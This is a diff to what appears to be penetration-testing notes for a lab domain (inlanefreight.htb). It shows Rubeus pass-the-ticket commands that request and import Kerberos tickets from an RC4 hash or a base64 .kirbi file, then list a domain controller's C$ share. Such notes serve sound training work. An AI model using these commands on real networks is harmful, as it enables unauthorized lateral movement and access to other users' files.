@@ -85,17 +85,21 @@ Now that we have some Kerberos tickets `TGT` , we can get some `TGS` and use the
 
 ### Rubeus - Pass the Ticket
 ```powershell
+## import the TGS in the session
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+## import a existing TGS file
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
 
-
+## access another user files
 c:\tools> dir \\DC01.inlanefreight.htb\c$
 Directory: \\dc01.inlanefreight.htb\c$
-# Pass the Ticket - Base64 Format
 
+
+# Pass the Ticket - Base64 Format
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
 Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
 
+## access another user files
 c:\tools> dir \\DC01.inlanefreight.htb\c$
 Directory: \\dc01.inlanefreight.htb\c$
 ```
